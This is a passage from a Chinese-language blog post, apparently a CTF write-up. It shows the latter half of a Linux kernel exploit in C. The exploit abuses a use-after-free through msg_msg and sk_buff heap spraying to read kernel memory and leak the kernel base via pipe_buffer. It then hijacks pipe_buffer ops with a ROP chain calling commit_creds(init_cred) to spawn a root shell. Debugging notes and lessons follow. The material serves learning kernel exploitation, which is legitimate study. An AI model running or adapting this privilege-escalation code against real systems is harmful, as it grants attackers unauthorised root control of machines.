class="line"></span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nearby_msg = (struct msg_msg*)&amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%llx\n&quot;</span>, nearby_msg-&gt;m_list.prev);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release and re-spray sk_buff to construct fake msg_msg</span></span><br><span class="line">    <span class="comment">// so that we can make an arbitrary read on a primary msg_msg</span></span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    buildMsg((struct msg_msg *)fake_secondary_msg, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, VICTIM_MSG_TYPE, <span class="keyword">sizeof</span>(oob_msg.mtext), nearby_msg-&gt;m_list.prev - <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;oob_msg.mtext[<span class="number">0x1000</span>] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// cal the addr of UAF obj by the header we just read out</span></span><br><span class="line">    nearby_msg_prim = (struct msg_msg*) &amp;oob_msg.mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="number">0x400</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n&quot;</span>, nearby_msg_prim-&gt;m_list.next);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n&quot;</span>, victim_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.IV</span></span><br><span class="line"><span class="comment">     * fix the header of UAF obj and release it</span></span><br><span class="line"><span class="comment">     * spray pipe_buffer and leak the kernel base</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// re-construct the msg_msg to fix it</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] fixing the UAF obj as a msg_msg...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(fake_secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(fake_secondary_msg));</span><br><span class="line">    buildMsg((struct msg_msg *)fake_secondary_msg, victim_addr, victim_addr, VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release UAF obj as secondary msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] release UAF obj in message queue...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (readMsg(msqid[victim_qid], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray pipe_buffer</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write something to activate it</span></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;yhellow&quot;</span>, <span class="number">8</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release the sk_buff to read pipe_buffer, leak kernel base</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] release sk_buff to read pipe_buffer...&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (struct pipe_buffer *) &amp;fake_secondary_msg;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], &amp;fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n&quot;</span>, pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;</span><br><span class="line">                kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n&quot;</span>, kernel_base, kernel_offset);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.V</span></span><br><span class="line"><span class="comment">     * hijack the ops of pipe_buffer</span></span><br><span class="line"><span class="comment">     * free all pipe to trigger fake ptr</span></span><br><span class="line"><span class="comment">     * so that we hijack the RIP</span></span><br><span class="line"><span class="comment">     * construct a ROP on pipe_buffer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.V hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] pre-construct data in userspace...&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (struct pipe_buffer *) fake_secondary_msg;</span><br><span class="line">    pipe_buf_ptr-&gt;page = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;yhellow&quot;</span>;</span><br><span class="line">    pipe_buf_ptr-&gt;ops = victim_addr + <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">    ops_ptr = (struct pipe_buf_operations *) &amp;fake_secondary_msg[<span class="number">0x100</span>];</span><br><span class="line">    ops_ptr-&gt;release = PUSH_RSI_POP_RSP_POP_4VAL_RET + kernel_offset;</span><br><span class="line"></span><br><span class="line">    rop_idx = <span class="number">0</span>;</span><br><span class="line">    rop_chain = (<span class="keyword">uint64_t</span>*) &amp;fake_secondary_msg[<span class="number">0x20</span>];</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;yhellow&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;yhellow&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = getRootShell;</span><br><span class="line">    rop_chain[rop_idx++] = user_cs;</span><br><span class="line">    rop_chain[rop_idx++] = user_rflags;</span><br><span class="line">    rop_chain[rop_idx++] = user_sp;</span><br><span class="line">    rop_chain[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff to hijack pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// for gdb attach only</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] gadget: %p\n&quot;</span>, kernel_offset + PUSH_RSI_POP_RSP_POP_4VAL_RET);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] free_pipe_info: %p\n&quot;</span>, kernel_offset + FREE_PIPE_INFO);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>太菜了，只能对着别人的 wp 进行调试，不过还是学到了不少东西：</p>
<ul>
<li><code>msg_msg</code>，<code>sk_buff</code> 的组合利用</li>
<li>两种关于 <code>msg_msg</code> 的泄露技巧（修改 <code>msg_msg-&gt;m_ts</code> 或者 <code>msg_msg-&gt;next</code>）</li>
<li>利用 <code>pipe_buffer</code> 泄露内核基地址，或者劫持RIP</li>
</ul>
<p><strong>补充：</strong></p>
<p>我仿照官方 exp 又自己打了一边，发现了许多之前没有理解的细节问题（改BUG真辛苦），接下来补充一些内容：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">buildMsg((struct msg_msg *)fake_secondary_msg, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">peekMsg(msqid[i],&amp;secondary_msg,<span class="keyword">sizeof</span>(secondary_msg),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">buildMsg((struct msg_msg *)fake_secondary_msg, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, VICTIM_MSG_TYPE, <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>第一个 <code>peekMsg</code> 因为修改了 <code>msg-&gt;m_ts</code> 而报错</li>
<li>第二个 <code>peekMsg</code> 也修改了 <code>msg-&gt;m_ts</code> 但是没有报错</li>
</ul>
<p>刚开始以为是：</p>
<ul>
<li><code>msg-&gt;m_ts</code> 大于 <code>sizeof(secondary_msg)</code> 导致 <code>secondary_msg</code> 溢出，而后续的 <code>sizeof(oob_msg)</code> 足够大，不会溢出</li>
</ul>
<p>后来又发现了新的内容：</p>
<ul>
<li>这里修改了 <code>msg-&gt;m_list</code> 也是有影响的：<ul>
<li>设置了 <code>MSG_COPY</code> 标志位，内核会将 message 拷贝一份后再拷贝到用户空间，原双向链表中的 message 并不会被 unlink</li>
<li>如果没有设置 <code>MSG_COPY</code>，则我们随便设置的 <code>msg-&gt;m_list</code> 一定会在 unlink 时报错</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">peekMsg(msqid[i],&amp;secondary_msg,<span class="keyword">sizeof</span>(secondary_msg),<span class="number">1</span>);</span><br><span class="line">peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg),<span class="number">1</span>);</span><br><span class="line">readMsg(msqid[victim_qid], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE);</span><br></pre></td></tr></table></figure>
<p>之前提到过：<code>msgtyp &gt; 0</code> ，返回队列中消息类型为 <code>msgtyp</code> 的消息：</p>
<ul>
<li><code>readMsg</code> 使用 <code>VICTIM_MSG_TYPE</code> 来获取对应的 UAF（遵守了这样的规则）</li>
<li><code>peekMsg</code> 使用的 <code>msgtyp</code> 都是“1”（并且非“1”不可）</li>
<li>这里还有点搞不懂，首先我把接收的数据打印出来，确定了 <code>msgtyp</code> 的确是 <code>SECONDARY_MSG_TYPE</code>，但把 <code>msgtyp</code> 改为 <code>SECONDARY_MSG_TYPE</code> 后反而接收不了数据了，然后我尝试修改 <code>SECONDARY_MSG_TYPE</code> 的值，发现并不影响结果，我感觉这是内核版本的问题（之后找机会看看源码）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spraySkBuff</span><span class="params">(<span class="keyword">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_socket[i][<span class="number">0</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">freeSkBuff</span><span class="params">(<span class="keyword">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">            <span class="keyword">if</span> (read(sk_socket[i][<span class="number">1</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里调用多次调用 <code>write</code> 和 <code>read</code> 是为了提高 <code>sk_buff</code> 命中 UAF 的概率</p>
<ul>
<li>PS：后面泄露 kernel_base 的时候一定要 read 所有的 <code>sk_buff</code>（<code>sk_buff</code> 读取后释放），不然之后的 <code>spraySkBuff</code> 会因为 <code>sk_buff</code> 存在而 write 失败，从而导致程序卡住</li>
</ul>

    </div>

    
    
    

      <footer class="post-footer">
          
          <div class="post-tags">
              <a href="/tags/pipe-buffer-attack/" rel="tag"><i class="fa fa-tag"></i> pipe_buffer attack</a>
              <a href="/tags/ret2usr/" rel="tag"><i class="fa fa-tag"></i> ret2usr</a>
              <a href="/tags/msg-msg-leak/" rel="tag"><i class="fa fa-tag"></i> msg_msg leak</a>
              <a href="/tags/pipe-buffer-leak/" rel="tag"><i class="fa fa-tag"></i> pipe_buffer leak</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/06/22/subprocess_info%20attack+%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/" rel="prev" title="subprocess_info attack+条件竞争">
      <i class="fa fa-chevron-left"></i> subprocess_info attack+条件竞争
    </a></div>
      <div class="post-nav-item">
    <a href="/2022/07/06/PHP%20pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+so%E6%96%87%E4%BB%B6%E7%9A%84%E8%B0%83%E8%AF%95/" rel="next" title="PHP pwn环境搭建+so文件的调试">
      PHP pwn环境搭建+so文件的调试 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">330</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">170</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">4.9m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">74:38</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
